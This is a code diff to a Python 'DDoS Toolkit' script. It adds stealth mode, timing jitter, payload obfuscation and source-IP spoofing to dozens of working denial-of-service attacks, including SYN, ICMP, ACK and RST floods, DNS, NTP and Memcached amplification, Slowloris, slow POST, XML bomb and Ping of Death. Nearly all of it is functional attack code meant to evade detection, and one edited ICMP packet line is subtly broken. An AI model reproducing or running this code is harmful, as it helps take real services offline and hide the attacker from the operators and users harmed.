@@ -58,7 +58,6 @@ class AttackType(Enum):
     LAND_ATTACK = auto()
     PING_OF_DEATH = auto()
 
-
 def check_library(lib_name: str) -> None:
     """Checks if a library is installed and prompts to install it if not."""
     try:
@@ -81,43 +80,42 @@ required_libraries = [
 for lib in required_libraries:
     check_library(lib.split(".")[0])
     
-import aiohttp  # Install module with pip aiohttp --break-system-packages
-import asyncio  # Install module with pip asyncio --break-system-packages
-import time  # Install module with pip time --break-system-packages
-import argparse  # Install module with pip argparse --break-system-packages
-import threading  # Install module with pip threading --break-system-packages
-from concurrent.futures import ThreadPoolExecutor, as_completed  # Install module with pip concurrent.futures --break-system-packages
-import random  # Install module with pip random --break-system-packages
-import json  # Install module with pip json --break-system-packages
-from itertools import cycle  # Install module with pip itertools --break-system-packages
-from collections import deque  # Install module with pip collections --break-system-packages
-from uuid import uuid4  # Install module with pip uuid --break-system-packages
-from base64 import b64encode  # Install module with pip base64 --break-system-packages
-import hashlib  # Install module with pip hashlib --break-system-packages
-import zlib  # Install module with pip zlib --break-system-packages
-import hmac  # Install module with pip hmac --break-system-packages
-import signal  # Install module with pip signal --break-system-packages
-import sys  # Install module with pip sys --break-system-packages
-import os  # Install module with pip os --break-system-packages
-import subprocess  # Install module with pip subprocess --break-system-packages
-import socket  # Install module with pip socket --break-system-packages
-import struct  # Install module with pip struct --break-system-packages
-import logging  # Install module with pip logging --break-system-packages
-import psutil  # Install module with pip psutil --break-system-packages
-import shutil  # Install module with pip shutil --break-system-packages
-import scapy.all as scapy  # Install module with pip scapy --break-system-packages
-import dns.resolver  # Install module with pip dnspython --break-system-packages
-from colorama import init, Fore, Style  # Install module with pip colorama --break-system-packages
-from tqdm import tqdm  # Install module with pip tqdm --break-system-packages
-from typing import Optional # Install module with pip typing --break-system-packages
+import aiohttp
+import asyncio
+import time
+import argparse
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import random
+import json
+from itertools import cycle
+from collections import deque
+from uuid import uuid4
+from base64 import b64encode
+import hashlib
+import zlib
+import hmac
+import signal
+import sys
+import os
+import subprocess
+import socket
+import struct
+import logging
+import psutil
+import shutil
+import scapy.all as scapy
+import dns.resolver
+from colorama import init, Fore, Style
+from tqdm import tqdm
+from typing import Optional
 from dataclasses import dataclass
 import re
-import ipaddress # Install module with pip ipadress --break-system-packages
-import ssl # Install module with pip ssl --break-system-packages
+import ipaddress
+import ssl
 from urllib.parse import urlparse
-import requests  # Install module with pip requests --break-system-packages
-from tabulate import tabulate  # Install module with pip tabulate --break-system-packages
-
+import requests
+from tabulate import tabulate
 
 # Initialize colorama
 init(autoreset=True)
@@ -220,7 +218,7 @@ def display_help() -> None:
     """Display comprehensive help information."""
     print(f"""
 {YELLOW}╔══════════════════════════════════════════════════════╗
-{YELLOW}║ {BLUE}DDoS Toolkit v.1.0 - Help Information{YELLOW}     ║
+{YELLOW}║ {BLUE}DDoS Toolkit v.1.0 - Help Information{YELLOW}                ║
 {YELLOW}╚══════════════════════════════════════════════════════╝
 {RESET}
 {CYAN}For more info, visit our website: https://ddostoolkit.vercel.app/{RESET}
@@ -242,6 +240,10 @@ def display_help() -> None:
   {GREEN}--payload-size BYTES{RESET}       Custom payload size (default: 1024)
   {GREEN}--random-ports{RESET}             Use random ports for flood attacks
   {GREEN}--tls{RESET}                      Use TLS/SSL for applicable attacks
+  {GREEN}--stealth{RESET}                  Enable stealth mode (slower but less detectable)
+  {GREEN}--jitter MS{RESET}                Add random delay jitter (milliseconds)
+  {GREEN}--obfuscate{RESET}                Obfuscate attack traffic
+  {GREEN}--spoof-ips FILE{RESET}           File containing IPs to spoof (one per line)
 
 {YELLOW}Attack Modes:{RESET}
   {CYAN}http-flood{RESET}               {CYAN}slowloris{RESET}               {CYAN}http2-flood{RESET}
@@ -262,7 +264,7 @@ def display_help() -> None:
 
 def parse_args():
     parser = argparse.ArgumentParser(
-        description=f"{YELLOW}Advanced DDoS Toolkit v1.0{RESET}",
+        description=f"{YELLOW}DDoS Toolkit v.1.0{RESET}",
         formatter_class=argparse.RawTextHelpFormatter,
         add_help=False
     )
@@ -298,6 +300,13 @@ def parse_args():
                           help="Use random ports for flood attacks")
     core_group.add_argument("--tls", action="store_true",
                           help="Use TLS/SSL for applicable attacks")
+    core_group.add_argument("--stealth", action="store_true",
+                          help="Enable stealth mode (slower but less detectable)")
+    core_group.add_argument("--jitter", type=int, default=0,
+                          help="Add random delay jitter (milliseconds)")
+    core_group.add_argument("--obfuscate", action="store_true",
+                          help="Obfuscate attack traffic")
+    core_group.add_argument("--spoof-ips", help="File containing IPs to spoof")
 
     # Additional features
     feature_group = parser.add_argument_group(f"{MAGENTA}Additional Features{RESET}")
@@ -329,6 +338,18 @@ def load_proxies(proxy_file: str) -> List[str]:
         return valid_proxies
     except FileNotFoundError:
         print(f"Proxy file '{proxy_file}' not found.")
+        return []
+
+def load_spoof_ips(spoof_file: str) -> List[str]:
+    """Load IP addresses for spoofing from a text file."""
+    try:
+        with open(spoof_file, "r") as f:
+            ip_list = f.read().splitlines()
+        valid_ips = [ip.strip() for ip in ip_list if ip.strip() and is_valid_ip(ip.strip())]
+        print(f"Loaded {len(valid_ips)} spoof IPs.")
+        return valid_ips
+    except FileNotFoundError:
+        print(f"Spoof IP file '{spoof_file}' not found.")
         return []
 
 def validate_proxies(proxies: List[str]) -> List[str]:
@@ -540,13 +561,30 @@ def is_valid_ip(ip: str) -> bool:
     except socket.error:
         return False
 
+def get_random_jitter(jitter_ms: int) -> float:
+    """Get random jitter delay in seconds."""
+    return random.randint(0, jitter_ms) / 1000.0
+
+def obfuscate_packet(packet: bytes) -> bytes:
+    """Obfuscate packet data with random noise."""
+    if len(packet) < 10:
+        return packet
+    # Insert random bytes at random positions
+    for _ in range(random.randint(1, 5)):
+        pos = random.randint(0, len(packet))
+        packet = packet[:pos] + os.urandom(1) + packet[pos:]
+    return packet
+
 async def rate_limited_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                              rate_limit: int, proxies: Optional[List[str]] = None, 
                              headers: Optional[Dict[str, str]] = None, 
-                             payload_type: str = "json", retry: int = 3) -> None:
-    """Perform rate-limited HTTP flood attack."""
+                             payload_type: str = "json", retry: int = 3,
+                             stealth: bool = False, jitter: int = 0, 
+                             obfuscate: bool = False, spoof_ips: Optional[List[str]] = None) -> None:
+    """Perform rate-limited HTTP flood attack with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
     semaphore = asyncio.Semaphore(rate_limit)
 
     if not target_url.startswith(("http://", "https://")):
@@ -561,7 +599,26 @@ async def rate_limited_attack(target_url: str, stop_event: threading.Event, paus
                         method = random.choice(HTTP_METHODS)
                         payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
 
+                        # Apply obfuscation if enabled
+                        if obfuscate and payload:
+                            payload = obfuscate_packet(payload)
+
                         proxy = next(proxy_pool) if proxy_pool else None
+                        
+                        # Apply stealth options
+                        if stealth:
+                            headers.update({
+                                "X-Forwarded-For": next(spoof_ip_pool) if spoof_ip_pool else ".".join(str(random.randint(1, 254)) for _ in range(4)),
+                                "Connection": "keep-alive",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                            })
+                            pause_time = max(pause_time, 0.5)  # Slower in stealth mode
+
+                        # Add jitter if specified
+                        if jitter > 0:
+                            await asyncio.sleep(get_random_jitter(jitter))
+
                         async with session.request(
                             method, target_url, headers=headers, proxy=proxy, 
                             data=payload, timeout=aiohttp.ClientTimeout(total=5)
@@ -587,8 +644,9 @@ async def rate_limited_attack(target_url: str, stop_event: threading.Event, paus
 
 async def slowloris_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                           rate_limit: int, proxies: Optional[List[str]] = None, 
-                          headers: Optional[Dict[str, str]] = None, retry: int = 3) -> None:
-    """Perform Slowloris attack (partial HTTP requests)."""
+                          headers: Optional[Dict[str, str]] = None, retry: int = 3,
+                          stealth: bool = False, jitter: int = 0) -> None:
+    """Perform Slowloris attack (partial HTTP requests) with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -602,6 +660,20 @@ async def slowloris_attack(target_url: str, stop_event: threading.Event, pause_t
                 for attempt in range(retry):
                     try:
                         headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
+                        
+                        # Apply stealth options
+                        if stealth:
+                            headers.update({
+                                "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
+                                "Connection": "keep-alive",
+                                "Accept-Encoding": "gzip, deflate, br"
+                            })
+                            pause_time = max(pause_time, 1.0)  # Slower in stealth mode
+
+                        # Add jitter if specified
+                        if jitter > 0:
+                            await asyncio.sleep(get_random_jitter(jitter))
+
                         async with session.get(
                             target_url, headers=headers, 
                             proxy=next(proxy_pool) if proxy_pool else None
@@ -624,136 +696,202 @@ async def slowloris_attack(target_url: str, stop_event: threading.Event, pause_t
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
 
-def syn_flood(target_ip: str, target_port: int, duration: int) -> None:
-    """Perform SYN flood attack."""
+def syn_flood(target_ip: str, target_port: int, duration: int, 
+             stealth: bool = False, random_ports: bool = False,
+             spoof_ips: Optional[List[str]] = None) -> None:
+    """Perform SYN flood attack with stealth options."""
     print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            ip_layer = scapy.IP(dst=target_ip)
-            tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+            src_port = random.randint(1024, 65535) if random_ports else target_port
+            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
+            
+            ip_layer = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
+            tcp_layer = scapy.TCP(sport=src_port, dport=target_port, flags="S")
             packet = ip_layer / tcp_layer
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during SYN flood: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("SYN flood attack completed.")
 
-def icmp_flood(target_ip: str, duration: int) -> None:
-    """Perform ICMP ping flood attack."""
+def icmp_flood(target_ip: str, duration: int, stealth: bool = False,
+              spoof_ips: Optional[List[str]] = None) -> None:
+    """Perform ICMP ping flood attack with stealth options."""
     print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            packet = scapy.IP(dst=target_ip) / scapy.ICMP()
+            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
+            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip) / scapy.ICMP()
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during ICMP flood: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("ICMP flood attack completed.")
 
-async def dns_amplification(target_ip: str, duration: int) -> None:
-    """Perform DNS amplification attack."""
+async def dns_amplification(target_ip: str, duration: int, stealth: bool = False,
+                           spoof_ips: Optional[List[str]] = None) -> None:
+    """Perform DNS amplification attack with stealth options."""
     print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
+            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
+            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
+            packet = packet / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during DNS amplification: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("DNS amplification attack completed.")
 
-def ftp_flood(target_ip: str, target_port: int, duration: int) -> None:
-    """Perform FTP flood attack."""
+def ftp_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
+    """Perform FTP flood attack with stealth options."""
     print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target_ip, target_port))
             sock.send(os.urandom(random.randint(512, 1024)))
             sock.close()
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
         except Exception as e:
             print(f"Error during FTP flood: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("FTP flood attack completed.")
 
-def ssh_flood(target_ip: str, target_port: int, duration: int) -> None:
-    """Perform SSH flood attack."""
+def ssh_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
+    """Perform SSH flood attack with stealth options."""
     print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target_ip, target_port))
             sock.send(os.urandom(random.randint(512, 1024)))
             sock.close()
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
         except Exception as e:
             print(f"Error during SSH flood: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("SSH flood attack completed.")
     
-def ntp_amplification(target_ip: str, duration: int) -> None:
-    """Perform NTP amplification attack."""
+def ntp_amplification(target_ip: str, duration: int, stealth: bool = False,
+                     spoof_ips: Optional[List[str]] = None) -> None:
+    """Perform NTP amplification attack with stealth options."""
     print(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
+            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
+            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
+            packet = packet / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during NTP amplification: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("NTP amplification attack completed.")
 
-def memcached_amplification(target_ip: str, duration: int) -> None:
-    """Perform Memcached amplification attack."""
+def memcached_amplification(target_ip: str, duration: int, stealth: bool = False,
+                           spoof_ips: Optional[List[str]] = None) -> None:
+    """Perform Memcached amplification attack with stealth options."""
     print(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
+            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
+            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
+            packet = packet / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during Memcached amplification: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("Memcached amplification attack completed.")
 
-def smurf_attack(target_ip: str, duration: int) -> None:
-    """Perform Smurf attack."""
+def smurf_attack(target_ip: str, duration: int, stealth: bool = False) -> None:
+    """Perform Smurf attack with stealth options."""
     print(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
             packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during Smurf attack: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("Smurf attack completed.")
 
-def teardrop_attack(target_ip: str, duration: int) -> None:
-    """Perform Teardrop attack."""
+def teardrop_attack(target_ip: str, duration: int, stealth: bool = False) -> None:
+    """Perform Teardrop attack with stealth options."""
     print(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
             packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / scapy.UDP() / ("X" * 64)
             packet2 = scapy.IP(dst=target_ip, flags=0, frag=1) / ("X" * 64)
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
             scapy.send(packet2, verbose=False)
         except Exception as e:
             print(f"Error during Teardrop attack: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("Teardrop attack completed.")
 
 async def http2_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
                      rate_limit: int, proxies: Optional[List[str]] = None, 
                      headers: Optional[Dict[str, str]] = None, 
-                     payload_type: str = "json", retry: int = 3) -> None:
-    """Perform HTTP/2 flood attack."""
+                     payload_type: str = "json", retry: int = 3,
+                     stealth: bool = False, jitter: int = 0,
+                     obfuscate: bool = False) -> None:
+    """Perform HTTP/2 flood attack with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -769,6 +907,23 @@ async def http2_flood(target_url: str, stop_event: threading.Event, pause_time: 
                         headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                         method = random.choice(HTTP_METHODS)
                         payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
+
+                        # Apply obfuscation if enabled
+                        if obfuscate and payload:
+                            payload = obfuscate_packet(payload)
+
+                        # Apply stealth options
+                        if stealth:
+                            headers.update({
+                                "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
+                                "Connection": "keep-alive",
+                                "Accept-Encoding": "gzip, deflate, br"
+                            })
+                            pause_time = max(pause_time, 0.5)  # Slower in stealth mode
+
+                        # Add jitter if specified
+                        if jitter > 0:
+                            await asyncio.sleep(get_random_jitter(jitter))
 
                         proxy = next(proxy_pool) if proxy_pool else None
                         async with session.request(
@@ -791,38 +946,49 @@ async def http2_flood(target_url: str, stop_event: threading.Event, pause_time: 
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
 
-def land_attack(target_ip: str, target_port: int, duration: int) -> None:
-    """LAND attack (send packets with source=dest)."""
+def land_attack(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
+    """LAND attack (send packets with source=dest) with stealth options."""
     print(f"Starting LAND attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
             packet = scapy.IP(src=target_ip, dst=target_ip) / \
                      scapy.TCP(sport=target_port, dport=target_port, flags="S")
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             logger.error(f"Error during LAND attack: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("LAND attack completed.")
 
-def ping_of_death(target_ip: str, duration: int) -> None:
-    """Ping of Death attack with oversized packets."""
+def ping_of_death(target_ip: str, duration: int, stealth: bool = False) -> None:
+    """Ping of Death attack with oversized packets and stealth options."""
     print(f"Starting Ping of Death attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
             packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / \
                      scapy.ICMP() / \
                      ("X" * 65500)
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             logger.error(f"Error during Ping of Death: {e}")
-        time.sleep(0.1)
+        time.sleep(0.1 if not stealth else 0.5)
     print("Ping of Death attack completed.")
 
 async def slow_post_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
-                          rate_limit: int, proxies: Optional[List[str]] = None) -> None:
-    """Slow POST attack with chunked transfer encoding."""
+                          rate_limit: int, proxies: Optional[List[str]] = None,
+                          stealth: bool = False, jitter: int = 0) -> None:
+    """Slow POST attack with chunked transfer encoding and stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -836,6 +1002,15 @@ async def slow_post_attack(target_url: str, stop_event: threading.Event, pause_t
         "Transfer-Encoding": "chunked"
     }
 
+    # Apply stealth options
+    if stealth:
+        headers.update({
+            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
+            "Connection": "keep-alive",
+            "Accept-Encoding": "gzip, deflate, br"
+        })
+        pause_time = max(pause_time, 1.0)  # Slower in stealth mode
+
     async def generate_chunked_data():
         yield b"1\r\na\r\n"
         await asyncio.sleep(10)
@@ -847,6 +1022,10 @@ async def slow_post_attack(target_url: str, stop_event: threading.Event, pause_t
         while not stop_event.is_set():
             async with semaphore:
                 try:
+                    # Add jitter if specified
+                    if jitter > 0:
+                        await asyncio.sleep(get_random_jitter(jitter))
+
                     proxy = next(proxy_pool) if proxy_pool else None
                     async with session.post(
                         target_url,
@@ -868,8 +1047,9 @@ async def slow_post_attack(target_url: str, stop_event: threading.Event, pause_t
                 await asyncio.sleep(pause_time)
 
 async def xml_bomb_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
-                         rate_limit: int, proxies: Optional[List[str]] = None) -> None:
-    """XML Bomb (Billion Laughs) attack."""
+                         rate_limit: int, proxies: Optional[List[str]] = None,
+                         stealth: bool = False, jitter: int = 0) -> None:
+    """XML Bomb (Billion Laughs) attack with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -899,10 +1079,23 @@ async def xml_bomb_attack(target_url: str, stop_event: threading.Event, pause_ti
         "Accept": "application/xml"
     }
 
+    # Apply stealth options
+    if stealth:
+        headers.update({
+            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
+            "Connection": "keep-alive",
+            "Accept-Encoding": "gzip, deflate, br"
+        })
+        pause_time = max(pause_time, 1.0)  # Slower in stealth mode
+
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
             async with semaphore:
                 try:
+                    # Add jitter if specified
+                    if jitter > 0:
+                        await asyncio.sleep(get_random_jitter(jitter))
+
                     proxy = next(proxy_pool) if proxy_pool else None
                     async with session.post(
                         target_url,
@@ -924,8 +1117,9 @@ async def xml_bomb_attack(target_url: str, stop_event: threading.Event, pause_ti
                 await asyncio.sleep(pause_time)
 
 async def ntlm_auth_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
-                         rate_limit: int, proxies: Optional[List[str]] = None) -> None:
-    """NTLM authentication flood attack."""
+                         rate_limit: int, proxies: Optional[List[str]] = None,
+                         stealth: bool = False, jitter: int = 0) -> None:
+    """NTLM authentication flood attack with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -939,10 +1133,22 @@ async def ntlm_auth_flood(target_url: str, stop_event: threading.Event, pause_ti
         "Connection": "keep-alive"
     }
 
+    # Apply stealth options
+    if stealth:
+        headers.update({
+            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
+            "Accept-Encoding": "gzip, deflate, br"
+        })
+        pause_time = max(pause_time, 1.0)  # Slower in stealth mode
+
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
             async with semaphore:
                 try:
+                    # Add jitter if specified
+                    if jitter > 0:
+                        await asyncio.sleep(get_random_jitter(jitter))
+
                     proxy = next(proxy_pool) if proxy_pool else None
                     async with session.get(
                         target_url,
@@ -962,50 +1168,71 @@ async def ntlm_auth_flood(target_url: str, stop_event: threading.Event, pause_ti
                     logger.error(f"Error during NTLM auth flood: {e}")
                 await asyncio.sleep(pause_time)
 
-def char_gen_flood(target_ip: str, target_port: int, duration: int) -> None:
-    """Character generator protocol flood attack."""
+def char_gen_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
+    """Character generator protocol flood attack with stealth options."""
     print(f"Starting CHAR-GEN flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                 sock.sendto(b"\x01", (target_ip, target_port))
+                
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
         except Exception as e:
             logger.error(f"Error during CHAR-GEN flood: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("CHAR-GEN flood attack completed.")
 
-def rst_flood(target_ip: str, target_port: int, duration: int) -> None:
-    """TCP RST flood attack."""
+def rst_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False,
+             spoof_ips: Optional[List[str]] = None) -> None:
+    """TCP RST flood attack with stealth options."""
     print(f"Starting RST flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            packet = scapy.IP(dst=target_ip) / \
-                     scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="R")
+            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
+            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
+            packet = packet / scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="R")
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             logger.error(f"Error during RST flood: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("RST flood attack completed.")
 
-def ack_flood(target_ip: str, target_port: int, duration: int) -> None:
-    """TCP ACK flood attack."""
+def ack_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False,
+             spoof_ips: Optional[List[str]] = None) -> None:
+    """TCP ACK flood attack with stealth options."""
     print(f"Starting ACK flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
+    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
+    
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            packet = scapy.IP(dst=target_ip) / \
-                     scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="A")
+            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
+            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
+            packet = packet / scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="A")
+            
+            if stealth:
+                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
+                
             scapy.send(packet, verbose=False)
         except Exception as e:
             logger.error(f"Error during ACK flood: {e}")
-        time.sleep(0.01)
+        time.sleep(0.01 if not stealth else 0.1)
     print("ACK flood attack completed.")
 
 async def http_fragmentation_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
-                                  rate_limit: int, proxies: Optional[List[str]] = None) -> None:
-    """HTTP packet fragmentation attack."""
+                                  rate_limit: int, proxies: Optional[List[str]] = None,
+                                  stealth: bool = False, jitter: int = 0) -> None:
+    """HTTP packet fragmentation attack with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -1019,10 +1246,22 @@ async def http_fragmentation_attack(target_url: str, stop_event: threading.Event
         "Connection": "keep-alive"
     }
 
+    # Apply stealth options
+    if stealth:
+        headers.update({
+            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
+            "Accept-Encoding": "gzip, deflate, br"
+        })
+        pause_time = max(pause_time, 1.0)  # Slower in stealth mode
+
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
             async with semaphore:
                 try:
+                    # Add jitter if specified
+                    if jitter > 0:
+                        await asyncio.sleep(get_random_jitter(jitter))
+
                     proxy = next(proxy_pool) if proxy_pool else None
                     connector = aiohttp.TCPConnector(force_close=True)
